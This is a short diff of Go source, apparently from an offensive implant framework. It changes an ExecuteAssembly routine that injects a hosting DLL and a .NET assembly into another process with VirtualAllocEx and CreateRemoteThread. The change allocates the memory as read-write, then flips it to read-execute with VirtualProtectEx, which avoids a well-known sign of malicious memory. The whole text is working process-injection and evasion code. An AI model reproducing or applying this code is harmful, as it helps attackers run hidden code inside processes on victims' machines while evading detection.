@@ -338,7 +338,7 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string, timeout int32) 
 		return "", err
 	}
 	// VirtualAllocEx to allocate a new memory segment into the target process
-	hostingDllAddr, err := virtualAllocEx(handle, 0, uint32(len(hostingDll)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
+	hostingDllAddr, err := virtualAllocEx(handle, 0, uint32(len(hostingDll)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
 	if err != nil {
 		return "", err
 	}
@@ -371,6 +371,15 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string, timeout int32) 
 	// {{if .Debug}}
 	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(final), assemblyAddr)
 	// {{end}}
+	// Apply R-X perms
+	var oldProtect int
+	err = virtualProtectEx(handle, hostingDllAddr, uint(len(hostingDll)), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
+	if err != nil {
+		//{{if .Debug}}
+		log.Println("VirtualProtectEx failed:", err)
+		//{{end}}
+		return "", err
+	}
 	// CreateRemoteThread(DLL addr + offset, assembly addr)
 	attr := new(syscall.SecurityAttributes)
 	_, _, err = createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
